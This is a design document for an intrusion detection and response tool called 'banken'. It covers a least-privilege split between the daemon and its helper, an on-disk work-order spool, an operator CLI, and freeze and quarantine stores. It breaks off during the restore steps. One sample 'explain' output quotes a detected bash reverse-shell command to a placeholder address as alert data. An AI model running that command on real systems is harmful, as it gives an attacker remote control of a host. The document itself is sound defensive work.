# Response architecture - the privileged split, the operator CLI, and the freeze/quarantine proofs

Status: **implementation design, not implemented.** Written 2026-11-02 against the tree on
`distro-matrix-mimi`. Three parts of that tree matter here:

- the executor at `internal/response/exec/exec_linux.go`
- the in-process responder at `internal/response/respond/responder.go`
- the KILL proof at `tests/response-enforce.nix`

Nothing here is built. No code is changed by this doc.

This is the third design pass on the response subsystem, and it is deliberately narrower than the
first two. `response-actions.md` is the spec: the decision layer, the primitives, the rails.
`enforcement-testing.md` and `quarantine.md` are the adversarial reads of the executor as built
(findings F1-F12, Q1-Q13). This doc takes the three things Conor named as the frontier and turns
them into one build plan:

1. the **two-process least-privilege split** (`banken-respond`), which the spec sketched in sections
   2, 3.5 and 8 and the implementation deferred;
2. the **operator CLI** `banken respond list | explain | thaw | restore`;
3. the **freeze and quarantine enforcement proofs** under KVM, mirroring the kill proof.

Where this doc and the spec disagree, this doc wins and says so in place. There are three such
points:

- no `requested` ledger phase
- the freeze store
- the `not-armed` rail

Where the code at this tree already closes a finding (F1, F2, F3 and F9 are in `identify()` and
`Collect()` today), the proof merely has to keep it closed.

Read these first, in this order:

- `response-actions.md` sections 3.5, 8 and 9
- `quarantine.md` sections 3, 5 and 10
- `enforcement-testing.md` sections 2, 4.7, 5.1 and 5.2

The one-sentence shape: **the daemon decides and writes a work order; a tiny privileged unit
re-decides from its own copy of the policy, re-checks the live target, acts, and records; every
reversible action has a store entry written before the act and a tombstone written on undo, so
`list`, `thaw` and `restore` read the store and the ledger, never the daemon.**

---

## 1. The architecture in one picture

```
banken.service (daemon, uid 0 today, CapabilityBoundingSet=CAP_DAC_READ_SEARCH only, ProtectProc=invisible)
  event -> engine -> alert -> Dispatcher -> respond.Responder
                                              Decide(alert, policy, armed)    [layer 1: policy rails]
                                              ledger decisions-<day>.jsonl: "decided"
                                              if Action != none: write work order
                                                 /var/lib/banken/spool.tmp/<id>.json  (write, fsync)
                                                 rename -> /var/lib/banken/spool/<id>.json
                                           -> sinks (journal / jsonl / webhook / otlp) as today

banken-respond.path  (DirectoryNotEmpty=/var/lib/banken/spool)
banken-respond.service (oneshot, uid 0, the ONLY unit holding CAP_KILL / CAP_SYS_PTRACE /
                        CAP_LINUX_IMMUTABLE / CAP_DAC_OVERRIDE / CAP_FOWNER, cgroup write)
  banken respond drain
    for each order, oldest first:
      parse (version, shape)                       -> "failed: malformed"
      age > spool.maxAge                           -> "expired"
      kill-switch present                          -> "failed: kill-switch"
      store has an entry for this order id         -> "already-applied"
      Decide(order.alert, policy FROM DISK, fresh budget/seen/kill-switch, armed)
                                                    [layer 2: the same rails, own process, own input]
      own Action != order.Action or target differs -> "downgraded"
      Executor.<Action>: identify()/inode rails     [layer 3: the live target]
        store manifest written BEFORE the act (freeze, quarantine, collect)
        act
      ledger actions-<day>.jsonl: executed | failed
      unlink the order

operator (root shell):
  banken respond list / explain        read the ledger + the stores, touch nothing
  banken respond thaw / restore        read the store, reverse the act in-process, write a tombstone
```

Three layers, three inputs. The daemon's `Decide` runs on the alert it parsed from untrusted
bytes. The helper's `Decide` runs on the alert carried in the order. It uses a policy the daemon
never touched, and a kill-switch the daemon never stat'ed. The executor's rails run on the live
pid or inode. A compromised daemon can lie about an alert. It cannot change what the policy maps
that lie to. It cannot bypass a rail. And it cannot touch anything itself.

---

## 2. The two-process split

### 2.1 Process and capability boundary

Two units, one binary, two subcommand paths that never meet in one process.

| | `banken.service` (daemon / one-shot scan) | `banken-respond.service` (helper) |
| --- | --- | --- |
| entry | `banken [--watch] -config ...` | `banken respond drain -config ...` |
| reads | audit log, sensor streams, rules, policy, kill-switch (stat) | spool, policy, kill-switch (stat), `/proc/<pid>/*` of any uid, the target inode, the stores |
| writes | cursor, alerts, `decisions-*.jsonl`, `spool/` | `actions-*.jsonl`, `freeze/`, `quarantine/`, `evidence/`, `/sys/fs/cgroup/banken.quarantine/`, files under `allowPaths`, unlinks in `spool/` |
| `CapabilityBoundingSet` | `CAP_DAC_READ_SEARCH` (unchanged from today's non-enforce unit; **no longer grows when enforce is on**) | `CAP_KILL CAP_SYS_PTRACE CAP_DAC_OVERRIDE CAP_FOWNER CAP_LINUX_IMMUTABLE CAP_DAC_READ_SEARCH` |
| `ProtectProc` | `invisible` | `default` |
| `ProtectControlGroups` | `true` | `false`, with `ReadWritePaths=/sys/fs/cgroup/banken.quarantine` |
| `PrivateTmp` | `true` | `false` (it quarantines files in `/tmp`) |
| `ProtectHome` | `true` | `false` (it quarantines files in `/home`); the write set is bounded by `ReadWritePaths` instead |
| `ReadWritePaths` | jsonl dir, ledger dir if outside the state dir | the cgroup root, every `response.quarantine.allowPaths` entry |
| `SystemCallFilter` | `@system-service` | `@system-service` plus `pidfd_open pidfd_send_signal renameat2` (named, not assumed to be in the group) |
| `StateDirectory` | `banken` | `banken` (same dir; both root today) |
| network | as today | `PrivateNetwork=true`, `RestrictAddressFamilies=AF_UNIX` (it has no reason to speak) |
| exists when | `services.banken.enable` | `services.banken.response.enable && services.banken.response.enforce` |

Why each helper capability:

- `CAP_KILL` for `pidfd_send_signal` to another uid's process
- `CAP_SYS_PTRACE` for `readlink /proc/<pid>/exe` and `/proc/<pid>/environ` of another uid
  (`PTRACE_MODE_READ`)
- `CAP_DAC_OVERRIDE` to traverse and write a `0700` home directory on the rename path
- `CAP_FOWNER` to rename or `fchmod` a file another uid owns in a sticky directory (`/tmp`)
- `CAP_LINUX_IMMUTABLE` for the neuter path and for clearing the bit on restore
- `CAP_DAC_READ_SEARCH` to read the policy and ledger whatever their mode

`CAP_NET_ADMIN` stays ungranted until `isolate` exists.

The set is fixed, not derived from the policy. The spec (section 8) floated deriving it, dropping
`CAP_LINUX_IMMUTABLE` when there is no quarantine entry. But the module cannot parse the operator's
policy YAML, and a second "which actions are on" option would be a second place to get wrong. A
kill-only host carries three file capabilities it never uses, in a unit whose only input is a
root-owned spool. That is a small, named rough edge. The knob can come later if the trade changes.

**Honest residual, and the item that closes it.** Both units run as uid 0 today. A uid-0 process
with `CAP_KILL` removed from its bounding set can still signal any process whose real uid is 0
(`kill(2)` permission is uid-equality OR `CAP_KILL`). It can also `chmod` any root-owned file
without `CAP_FOWNER`.

So after the split, a daemon RCE cannot:

- touch alice's reverse shell or alice's dropped payload
- write a cgroup
- set an immutable bit
- `pidfd_open` (syscall filter)
- see other users' `/proc` entries

It CAN still signal a root process by plain pid.

The boundary becomes complete when the daemon stops being root: `User=banken` with
`AmbientCapabilities=CAP_DAC_READ_SEARCH`, the one capability it has ever needed, to read root's
audit log. That is build item 10. It is kept separate because it touches ownership of every state
file and must be proven on the real distro matrix, not just the VM. Until it lands, the README says
"the daemon holds no capability to act on another user's process or file". After it lands, the
README says "the daemon cannot act on any process or file".

### 2.2 IPC: an on-disk spool, not a socket

The spec chose a spool and a `.path` unit. This doc keeps that choice. It weighed a Unix socket
with a socket-activated helper, but the spool wins on every axis that matters here:

- **Durability is free.** A work order is a file. A daemon crash after the rename loses nothing. A
  helper crash mid-order leaves the order for the next run. A socket would need the daemon to hold
  unacknowledged requests and retry, which is state in the process we trust least.
- **Both daemon shapes work unchanged.** The one-shot scan (timer) writes orders and exits. The
  `--watch` daemon writes orders and continues. Neither waits. A socket would need the one-shot to
  block on a reply, or to fire-and-forget over a connection, which is the spool with extra steps.
- **It is auditable with `ls`.** An order in flight is a file an operator can read. A connection is
  not. `tamper_banken` already watches `/var/lib/banken`.
- **No protocol.** No framing. No fd passing. No connection lifecycle. The only version handshake
  is one integer in the JSON. The helper's entire input surface is one JSON document per order.
- **The result channel already exists.** The daemon never needs a synchronous answer. It recorded
  `decided`, and the helper records `executed`/`failed`. `list` and `explain` join the two by id.

The cost is latency. The path unit fires on inotify when the order lands (microseconds), and
systemd starts a oneshot (tens to a couple of hundred ms). Against a 2 min scan interval that is
noise. Against mimi's capture-to-match path it is the next thing to measure, and
`enforcement-testing.md` section 4.1 already plans the histogram.

Paths (all under `StateDirectory=banken`, `0700 root`):

```
/var/lib/banken/spool/          work orders, one file each, name = decision id (time-ordered hex)
/var/lib/banken/spool.tmp/      the daemon writes here, fsyncs, then renames into spool/
```

The tmp directory is a sibling, not a dotfile or subdirectory inside `spool/`. This is because
`DirectoryNotEmpty` counts any entry. A half-written order inside `spool/` would make the path
unit fire a drain that finds nothing to do, then fire again, for as long as the tmp file lives.
`rename(2)` between two directories on one filesystem is atomic, so the helper only ever sees
complete orders.

### 2.3 The work order

```json
{
  "version": 1,
  "id": "0189f3b2c9d1e4a7b8c0d1e2",          // the decided ledger line's id; also the filename stem
  "time": "2026-11-02T06:12:03Z",             // when the daemon decided
  "alert": { ... },                            // the full alert.Alert, verbatim: the helper re-decides from THIS
  "decision": { ... },                         // the daemon's Decision (intended, action, scope, target, entry, masquerade)
  "policy": "sha256:9f2c...",                  // the policy hash the daemon decided under
  "banken": "0.5.0"
}
```

The alert is carried whole because `Decide` is pure over `(alert, policy, ...)` and the helper
must be able to run it. A Decision alone is a conclusion the helper would have to trust. The
`decision` field is what the helper compares its own verdict against. It is never acted on
directly. `policy` is for the record. The helper always loads the policy from disk, and when the
hashes differ the ledger shows which policy decided and which policy acted.

`version` is checked first. An unknown version is `failed: malformed`. The order is unlinked after
the ledger line, never left to wedge the queue.

### 2.4 The drain: re-validation is the trust model

`banken respond drain` is `internal/response/drain` (a new package) plus the subcommand. It imports
`internal/response` (for `Decide`, `Policy`, `Ledger`) and `internal/response/exec`. The daemon's
`internal/response/respond` stops importing `exec` entirely. After this change, no code path in the
daemon process links the executor's mutating methods to a call site. `internal/response` still
imports neither.

Startup, before any order is read. It fails closed: any failure exits non-zero and touches nothing.

1. Load `banken.yml`, load the policy from `response.policyFile` / `response.policy` with the same
   `loadResponsePolicy` the daemon uses. The helper never reads a policy out of an order.
2. Check `policy.quarantine.allowPaths` against `response.quarantineAllowPaths` from `banken.yml`
   (the list the module also rendered into the unit's `ReadWritePaths`, section 2.8). A policy path
   not under a sandbox path is a startup error that names both. The alternative is a rename that
   fails with EROFS at the first real alert, which is the silent-disarm failure
   `enforcement-testing.md` section 5.6 warns about.
3. Open the ledger. Build the executor with `Enforce: cfg.Response.Enforce`, `AllowRoot:
   policy.AllowRoot`, the store dirs, `QuarantineAllowPaths: policy.Quarantine.AllowPaths`,
   `MaxFileBytes: policy.Quarantine.MaxFileBytes`.
4. **Recovery pass** over the stores:
   - a quarantine manifest with `method: pending` is finished or rolled back (section 2.7)
   - a freeze manifest with `state: pending` has its pids checked and is finalised or tombstoned
   - an empty `banken.quarantine/<id>` cgroup dir with a thawed/killed handle is removed (F8's
     second half)

   Each repair is a ledger line (`recovered`).

Then, until the spool is empty:

5. List `spool/`, sort by name (time order). For each order:
   - parse; bad JSON, wrong version, nil target -> `failed: malformed`, unlink.
   - `now - order.time > spool.maxAge` -> `expired`, unlink. Default `10m`: five default scan
     intervals; a kill landing later than that is a kill the operator did not expect. It is
     `response.spool.maxAge` in `banken.yml`, module option `response.spool.maxAge`.
   - kill-switch present (fresh `stat`) -> `failed: kill-switch`, unlink.
   - a store entry whose manifest carries this order id -> `already-applied` with that handle,
     unlink. This is what makes a replayed order (helper crash between act and unlink, or an
     operator copying an order back in) a no-op for freeze, quarantine and collect. Kill has no
     store; a replayed kill finds the pid gone (`failed: gone`) or a reuser (`failed: stale`), both
     correct.
   - `response.Decide(Input{Alert: order.Alert, Policy: <disk>, Self: <helper's own exe>, KillSwitch:
     <fresh>, Budget: <from the ledger: executed lines in the last hour, plus this pass>, Seen:
     <targets acted on in this pass>, Armed: cfg.Response.Enforce})`.
   - the helper's `Decision.Action != order.Decision.Action`, or `targetKey` differs ->
     `downgraded` with both verdicts in the line, unlink. **An order can only ever lower what
     happens, never raise it** (spec 3.5 step 1). The classic case is a forged `kill` for a rule the
     policy maps to `freeze` or to nothing.
   - dispatch to the executor exactly as `respond.invoke` does today; `executed` or `failed` with
     the handle or the error (`ErrStaleTarget`, `ErrGone`, `ErrDenied` are good outcomes to see).
   - unlink the order. A failure to unlink is the one error that exits the drain non-zero. It
     cannot be made idempotent by force. The unit's `StartLimitBurst` (section 2.8) stops the
     path unit from spinning on it while the journal says why.

A note on the budget. The daemon still counts its run-local `runUsed`/`hourUsed` and dedupes on
`Seen`, which it must do to avoid writing duplicate orders. But the helper's count from the actions
ledger is the one that binds. Two counters, one authority.

The helper's `SelfIdentity` is its own exe realpath. That is the same binary as the daemon, so
"target is banken itself" still holds for both processes.

### 2.5 The `not-armed` rail: enforcement stays OFF across the split

Today there are three gates:

- `response.enable` - the responder exists
- `mode: enforce` in the policy - `Decide` returns a real action
- `response.enforce` - the executor is armed; otherwise the call is a dry-run that verifies the
  target and records `dryRun: true`

After the split the daemon can no longer dry-run: it cannot `pidfd_open`, and cannot read other
users' `/proc`. And the helper must not exist on a host that has not armed enforcement. So the
third gate moves up into the decision:

```go
// types.go
RailNotArmed Rail = "not-armed"
// Input gains:
Armed bool `json:"armed"`   // the caller's response.enforce; false = decided, never requested
```

`Decide` evaluates it last, after the mode check. So an observe-mode host still shows
`observe-mode`. An enforce-mode host without `response.enforce` shows `not-armed: response.enforce
is off: would kill pid 4242 (/tmp/.x/sh)`. The daemon writes no order when any rail fired.
`response.enforce` is both the daemon's `Armed` input and the module's switch for the helper units.
So the three states are:

| `response.enable` | policy `mode` | `response.enforce` | decided line | order | helper unit |
| --- | --- | --- | --- | --- | --- |
| false | - | - | none (no responder) | no | no |
| true | observe | any | `rail: observe-mode` | no | no |
| true | enforce | false | `rail: not-armed` | no | no |
| true | enforce | true | `action: kill` | yes | yes |

One thing is lost against today: the dry-run executor's live `Verify` on a not-armed host. The
ledger had the live exe and start time in a `dryRun: true` handle. That was never an
operator-facing promise. The decided line still carries the target, and `banken respond explain
<id> -verify` (section 3.3) runs the same `Verify` on demand. The `Config.Enforce` gate inside the
executor stays as a second belt. A drain started by hand with `response.enforce: false` in the
config is a dry-run that prints what it would do, which is also how the drain's own unit tests run.

The module assertion from `enforcement-testing.md` section 5.4 becomes checkable with no VM. The
rendered config for a default `services.banken.response.enable = true` contains no
`banken-respond.service`, and `response.enforce: false`.

### 2.6 Failure and restart semantics

| Failure | What is on disk | What happens next |
| --- | --- | --- |
| daemon crashes after `decided`, before the order rename | decided line; tmp file in `spool.tmp/` | nothing acts (the ledger shows a decided action with no `executed`; `explain` says "never requested"); the next drain sweeps `spool.tmp/` entries older than `maxAge` |
| daemon crashes after the rename | the order | the path unit fires; the helper acts; the daemon's absence is irrelevant |
| ledger write fails in the daemon | nothing | no order is written (`respond.Respond` already stops here: an action without a record is worse than no action) |
| helper cannot load the policy / open the ledger | the orders, untouched | drain exits non-zero; `StartLimitBurst` stops the retry storm; orders expire by `maxAge` when the policy is fixed later |
| helper crashes before the act | the order | re-run; same outcome as the first attempt would have had |
| helper crashes between the store manifest and the act | manifest `pending`, target untouched (quarantine: file still at origin; freeze: pids still home) | recovery pass rolls back (`recovered: rolled-back`), the order is then processed normally, `already-applied` does not fire (the rolled-back entry is tombstoned, not live) |
| helper crashes between the act and the manifest finalise | manifest `pending`, file in store / pids in the cgroup | recovery finalises from the store alone (`(dev, ino)` or `cgroup.procs` against the manifest), ledger `recovered: finalised`; the order then hits `already-applied` |
| helper crashes between the act and the ledger line | finalised manifest, no `executed` | the order hits `already-applied`, which writes the line with the handle; the chain is complete one run late |
| helper crashes between the ledger line and the unlink | everything | `already-applied` again, idempotent |
| kill lands, process is in `D` state | ledger `executed` with `exited: false` | unchanged from `enforcement-testing.md` 4.5; not re-designed here |
| `rmdir` of the kill cgroup returns EBUSY | an empty cgroup dir | the executor waits for `cgroup.events` `populated 0` (bounded; section 5 F8), the recovery pass removes stragglers |
| the spool fills (flood) | many orders | the per-run and per-hour budgets still bind in the helper's `Decide`; `rate-limit` lines are `downgraded`; orders past `maxAge` expire |

The invariant across the table: **a real act is always preceded by a store manifest (reversible
actions) or a decided line (every action), and every act is eventually followed by an `executed`
line or a `recovered` line, written by the only process that could know.**

### 2.7 Stores: manifest first, tombstone on undo

The quarantine store from `quarantine.md` section 3.1 is kept, and the same shape is given to
freeze. So `list`, `thaw` and `restore` have one thing to learn:

```
/var/lib/banken/freeze/<id>/manifest.json      written BEFORE migrating pids; 0400 after finalise
                           thawed.json         tombstone: time, operator uid, per-pid outcome
/var/lib/banken/quarantine/<id>/manifest.json  written BEFORE the rename (Q2); 0400 + immutable after finalise
                               file            the inode (rename method only), 0000 + immutable
                               restored.json   tombstone: time, operator uid, destination, per-check outcome
/var/lib/banken/evidence/<id>/manifest.json    written first; then the /proc snapshot files
```

`Handle.ID` is the store id and the directory name. `Handle.Undo` becomes the same id. Today it is
a JSON blob for freeze and a directory path for quarantine; both go. Thaw and restore find
everything they need in the store, so the ledger is a record, not a database the undo depends on.
A `dryRun` handle has no store entry, and `thaw`/`restore` on one say so.

Freeze manifest (new):

```json
{
  "id": "...", "version": 1, "order": "<decision id>",
  "state": "pending | frozen",
  "method": "cgroup | sigstop",
  "target": { "pid": 4242, "exe": "/tmp/.x/sh", "startTime": "..." },   // the identity identify() bound
  "scope": "tree",
  "pids": [4242, 4243],
  "orig": { "4242": "/user.slice/user-1000.slice/session-3.scope", "4243": "..." },
  "cgroup": "/sys/fs/cgroup/banken.quarantine/<id>",
  "alert": { "ledgerId": "...", "rule": "reverse_shell", "level": "high", "user": "alice" },
  "time": "...", "bootId": "...", "banken": "0.5.0"
}
```

`bootId` matters for freeze. A cgroup does not survive a reboot. So `list` shows a frozen handle
from a previous boot as `lost (reboot)`, and `thaw` on it writes the tombstone without touching
anything. The quarantine manifest gains `order` and `version`, and otherwise follows `quarantine.md`
section 3.5. `inUse`, `owner`, `xattrs` and the rest are Q5/Q8 and stay out of this plan. The
fields this plan's proofs need are `method`, `origPath`, `stat` with `dev`+`ino`, `sha256`,
`immutable`, and `order`.

The idempotency key is the order id in the manifest. Freeze gains a second key for F7. Before
creating a cgroup, the executor reads `/proc/<pid>/cgroup` of the target. If it is already under
`CgroupRoot`, the existing id is the handle and no second cgroup is made.

### 2.8 NixOS module wiring

New options under `services.banken.response`:

- `spool.maxAge` (str, default `"10m"`): rendered into `banken.yml` `response.spool.maxAge`.
- `quarantine.allowPaths` (list of str, default `[ "/tmp" "/var/tmp" "/dev/shm" "/home" "/root"
  "/opt" ]`, the `quarantine.md` 4.1 default): rendered into the helper unit's `ReadWritePaths`
  **and** into `banken.yml` `response.quarantineAllowPaths` so the drain can refuse a policy the
  sandbox would not let it honour (section 2.4 step 2).

Changed behaviour:

- `response.enforce` no longer touches `banken.service` at all. Three things are removed:
  - the `lib.optionals cfg.response.enforce [ "CAP_KILL" "CAP_SYS_PTRACE" ]`
  - the `ProtectProc` flip
  - the pidfd syscall additions

  The daemon unit is byte-identical whether enforcement is armed or not. This is the whole point,
  and the module test asserts it (`nix eval` of both configs, compare the rendered `banken.service`).
- `response.enforce` now emits `banken-respond.service` and `banken-respond.path`, with the unit
  properties of section 2.1 and:

```
banken-respond.path:    Unit=banken-respond.service
                        DirectoryNotEmpty=/var/lib/banken/spool
                        MakeDirectory=true   DirectoryMode=0700
                        wantedBy=[multi-user.target]
banken-respond.service: Type=oneshot
                        ExecStart=banken respond drain -config /etc/banken/banken.yml
                        after=[auditd.service]   (ordering only; the helper has no sensor dependency)
                        unitConfig.StartLimitIntervalSec=60  StartLimitBurst=5
                        OOMScoreAdjust=-900
                        NoNewPrivileges, ProtectSystem=strict, PrivateDevices, ProtectKernel*,
                        ProtectClock, ProtectHostname, RestrictNamespaces, RestrictRealtime,
                        RestrictSUIDSGID, LockPersonality, MemoryDenyWriteExecute,
                        SystemCallArchitectures=native, SystemCallErrorNumber=EPERM, UMask=0077
```

`StartLimitBurst=5` in 60 s. A drain that fails five times in a minute stops being retried until
the operator looks - an unreadable policy, or an order it cannot unlink. The number is the systemd
default shape, not a tuned constant. It is in the unit so the journal names the rate limit.

- Assertions: `response.enforce -> response.enable`; and every `quarantine.allowPaths` entry is
  absolute and not under a never-touch prefix. That is the same check `ParsePolicy` makes, so the
  module fails at `nixos-rebuild` rather than the helper failing at start.
- `tests/vm.nix` and every non-enforce configuration render no helper unit. The existing enforce
  VM tests set `response.enforce = true` and get both units.

No ordering between the units is needed. The daemon writes orders whether or not the helper is up,
and the path unit catches up when it is. The helper does not need the daemon at all. An operator
can drop an order in by hand, which the proofs use.

### 2.9 What the split buys

- **A daemon RCE cannot directly kill, freeze, quarantine or neuter.** The process that parses
  untrusted input - audit bytes, sensor streams, rule files, threat-intel feeds - holds one
  capability, and it is a read capability. Its only lever on the helper is a JSON file that is
  re-decided under rails it does not control. The worst it can do is request an action the policy
  already allows, against a target the rails already allow. That request is on the ledger with the
  alert it claimed.
- **The surface that holds capabilities is small and auditable.** `banken respond drain` is the
  drain loop, the policy loader, `Decide`, and `exec_linux.go`. It reads one JSON shape, the
  policy, and `/proc`. It never sees a log line.
- **The chain of custody has two identities.** The journal shows `banken.service` deciding and
  `banken-respond.service` acting, from different unit cgroups. `tamper_banken` and the audit
  trail distinguish the requester from the actor.
- **Dry-run stops being a code path that touches real primitives inside the daemon.** The
  `not-armed` rail is a string on a ledger line. The daemon has nothing left to accidentally arm.

What it does not buy (section 2.1): protection of uid-0 targets from a uid-0 daemon, until item 10.

### 2.10 Code layout after the split

| Package / file | Change |
| --- | --- |
| `internal/response/types.go` | `Input.Armed`, `RailNotArmed` |
| `internal/response/decide.go` | the rail, evaluated after the mode check |
| `internal/response/spool.go` (new) | `Spool{dir, tmpDir}`: `Write(order) error` (tmp + fsync + rename), `List() []name`, `Read(name) (Order, error)`, `Remove(name)`, `SweepTmp(maxAge)` |
| `internal/response/order.go` (new) | the `Order` struct of section 2.3 |
| `internal/response/respond/responder.go` | drops the executor; `Respond` = Decide, ledger, spool write; `New` takes a `*Spool` instead of an `exec.Executor` |
| `internal/response/drain/` (new) | `Drain(ctx, cfg) error`: startup checks, recovery pass, the loop of section 2.4; tested against a fake executor |
| `internal/response/exec/` | `Handle.Undo` = store id; freeze store; recovery helpers; the F/Q fixes of section 5 |
| `respond.go` (new, top level, beside `status.go`) | `banken respond drain|list|explain|thaw|restore` dispatch |
| `main.go` | `case "respond"`; `setupResponder` builds the spool, not the executor |
| `internal/config/config.go` | `Response.Spool.MaxAge`, `Response.QuarantineAllowPaths` |
| `module.nix` | section 2.8 |
| `tests/lib/enforce-spawn.nix` | `enf_scan()`, `enf_order()`, the heartbeat carrier (section 4.1) |

---

## 3. The operator CLI: `banken respond`

All five subcommands share these:

- `-config` (default `/etc/banken/banken.yml`, to find the state dir, the policy and the stores)
- `-json` (one JSON object per record on stdout, for scripts; the human table otherwise)
- exit code 0 for "done or already done", 1 for "refused or failed, reason on stderr", 2 for usage

Ids are the 24-hex handle or decision ids. A unique prefix of at least 8 characters is accepted
(the `quarantine.md` section 5 listing shows 8).

Which of them need privilege:

| Subcommand | Touches | Needs |
| --- | --- | --- |
| `list` | reads ledger, stores, `cgroup.events`/`cgroup.procs`, re-hashes stored files | read access to root's `0700` state dir and `0000` stored files: a root shell, or `CAP_DAC_READ_SEARCH`; no act capability |
| `explain` | reads ledger and stores; with `-verify`, `Executor.Verify` (pidfd + `/proc/<pid>`) | as `list`; `-verify` needs `CAP_SYS_PTRACE` for another uid's `/proc/<pid>/exe`, i.e. a root shell |
| `thaw` | writes `cgroup.procs`, `cgroup.freeze`, `rmdir`, SIGCONT via pidfd | `CAP_KILL`, cgroup write: a root shell |
| `restore` | `renameat2`, `fchmod`, `FS_IOC_SETFLAGS` | `CAP_FOWNER`, `CAP_DAC_OVERRIDE`, `CAP_LINUX_IMMUTABLE`: a root shell |
| `drain` | everything | the helper unit (section 2) |

`thaw` and `restore` run the executor **in-process under the operator's root shell**, not through
the spool. There are two reasons:

- They are synchronous and interactive: the operator wants the result on their terminal.
- The operator's `sudo` is already the privilege boundary. Routing an undo through the path unit
  would add an undo-order type and a wait, and nothing to the trust model. An undo is the safe
  direction.

They use the same `exec` package and the same store code the drain uses. So there is one
implementation of "reverse this handle". They write the same ledger file the drain writes: one
`write(2)` per line with `O_APPEND`, so two writers never interleave within a line. The per-day
file split was about the daemon vs the helper and still holds.

`list` and `explain` never call a mutating method and never need the helper. On a Mac (`go test
./...`) they work on a fixture ledger and store under `t.TempDir()`.

### 3.1 `list`

```
banken respond list [-since 24h] [-kind freeze|kill|quarantine|collect] [-state held|frozen|thawed|restored|lost] [-json]
```

Reads `actions-*.jsonl` within `-since` (default `24h`) and joins every `executed` line to its
store entry by handle id. One line per handle:

```
ID        KIND        STATE                 TARGET                        USER   RULE                 WHEN
0189f3b2  freeze      frozen (2 pids)       pid 4242 /tmp/.x/sh           alice  reverse_shell        2026-11-02 06:12:03
0189f3c0  quarantine  held  sha256 ok       /tmp/.x/payload 48 KiB rename alice  exec_from_tmp        2026-11-02 06:12:05
0189f3c7  quarantine  held  neuter-weak     /dev/shm/x.so 12 KiB neuter   alice  exec_from_tmp        2026-11-02 06:12:05
0189f3d1  kill        killed (pidfd)        pid 4300 /run/enf/cat         alice  credential_file_read 2026-11-02 06:12:06
0189f3e0  freeze      thawed 06:40          pid 4242 /tmp/.x/sh           alice  reverse_shell        2026-11-02 06:12:03
```

The state column is computed from the store and the live system, never from the ledger alone:

- freeze: tombstone present -> `thawed <time>`. Else `bootId` differs -> `lost (reboot)`. Else read
  `<cgroup>/cgroup.events` and `cgroup.procs`: `frozen 1` and every manifest pid present ->
  `frozen (N pids)`; a pid missing -> `frozen (pid X moved|gone)` (the escape detection of
  `enforcement-testing.md` 4.6); the dir missing -> `lost (cgroup gone)`.
- quarantine: tombstone -> `restored <time> [-> path]`. Else `rename`: `fstat` the stored file,
  `(dev, ino)` against the manifest (`lost (inode replaced)` on mismatch), re-hash bounded by
  `maxFileBytes` -> `sha256 ok | CHANGED (was .., now ..) | unhashed`. `neuter`: `O_PATH|O_NOFOLLOW`
  open of `origPath`, `(dev, ino)` check, then `mode`/immutable as they are now -> `held` or
  `TAMPERED (mode 0755, immutable 0)`; a non-root-owned file whose immutable bit did not take is
  `neuter-weak` as `quarantine.md` 3.3 defines.
- kill: `killed (<method>)`; `collect`: `collected`.

`-json` emits `{"id","kind","state","live":{...},"manifest":{...},"action":{...}}` per handle,
the manifest verbatim.

### 3.2 `explain`

```
banken respond explain <decision-id | handle-id> [-verify] [-json]
```

It accepts either id. From a decision id, it finds the `decided` line and every action line with
that `decisionId`. From a handle id, it finds the `executed` line and walks back to its decision.
It then prints the chain in the order it happened:

```
decision 0189f3b2c9d1e4a7b8c0d1e2   2026-11-02T06:12:03Z   policy sha256:9f2c..   mode enforce   armed yes
  alert    reverse_shell (high, auditd) at 06:10:41  pid 4242 ppid 4100 user alice
           image /tmp/.x/sh   cmd "sh -i >& /dev/tcp/192.0.2.1/4444 0>&1"   tags attack.t1059.004
  entry    freeze-revshell -> intended freeze (tree)
  rails    none fired   masquerade: no
  verdict  freeze tree of pid 4242
action   0189f3b3..   executed by banken-respond   06:12:03.418   policy sha256:9f2c.. (same)
  helper re-decided: freeze (agrees)
  identity bound: exe /tmp/.x/sh  start 06:10:41.030  uid 1000  cgroup /user.slice/.../session-3.scope
  method cgroup   handle 0189f3b2   pids [4242 4243]   store /var/lib/banken/freeze/0189f3b2
  state now: frozen (2 pids)                           <- from the store + cgroup.events, as list
```

The outcome lines vary by action:

- a refused action: the `rails` line names the rail and reason verbatim from the ledger
- a `downgraded` action: both verdicts are shown
- a `failed` action: the error string

The "identity bound" line comes from `Handle.Exe`/`Handle.StartTime` plus the live fields the
executor records. The drain writes `live` into the action line as the spec section 9 says, and
today's `RecordAction` gains that field. `-verify` additionally runs `Executor.Verify` on the
decision's `ProcessRef` right now, and prints `verify now: ErrGone` or the live identity. So an
operator can answer "is it still there" without `ps`. `-verify` is the one read that needs
`CAP_SYS_PTRACE`. Without it the subcommand is pure file reading.

A decided line whose action is not `none`, but has no action line and no spool entry, prints
`never requested (no order found; the daemon may have crashed between the decision and the order)`.
With an order still in the spool, it prints `requested, not yet drained (order in spool for 3s)`.

### 3.3 `thaw`

```
banken respond thaw <handle-id>
```

1. Read `freeze/<id>/manifest.json`. No entry -> exit 1 `no freeze store entry for <id> (a dry-run
   handle, or not a freeze)`. Tombstone present -> print `already thawed at <time>`, write a
   ledger `thawed` line with `note: already`, exit 0.
2. `state: pending` -> the same recovery as the drain's startup pass, then continue.
3. `bootId` differs -> nothing to move; write the tombstone with `outcome: reboot`, ledger
   `thawed`, exit 0.
4. For `method: cgroup`: for each manifest pid, confirm it is in `<cgroup>/cgroup.procs` (a pid not
   there is `moved` or `gone`, recorded, skipped); write it back to `orig[pid]` (`moved-home`), and if
   `orig` is missing or no longer exists, to the parent of the quarantine root's own cgroup
   (`moved-fallback`, loud). Then `cgroup.freeze = 0` and `rmdir`; an EBUSY after the bounded
   populated-wait is recorded, never fatal. For `method: sigstop`: SIGCONT via a fresh pidfd per
   pid, after a start-time check against the manifest's `target` for the root pid.
5. Write `thawed.json` (time, operator uid from `SUDO_UID` if set else the real uid, per-pid
   outcome), ledger `thawed` referencing the handle and the decision id, print one line per pid.

It is idempotent by the tombstone, and a second thaw is step 1. The thaw never signals or moves a
pid it did not find in its own cgroup. So a pid reused after the frozen process was killed by
someone else is never touched.

### 3.4 `restore`

```
banken respond restore <handle-id> [-to PATH]
```

`quarantine.md` section 5 with Q3 and Q4 closed:

1. Read the manifest. No entry -> exit 1. Tombstone -> `already restored at <time> to <path>`,
   ledger `restored` with `note: already`, exit 0. `method: pending` -> recover, then continue.
2. `rename`: `fstat` the stored `file`; require `(dev, ino)` both equal the manifest (Q4); clear
   immutable on the fd; `fchmod` the recorded mode; `renameat2(store/file, dest, RENAME_NOREPLACE)`
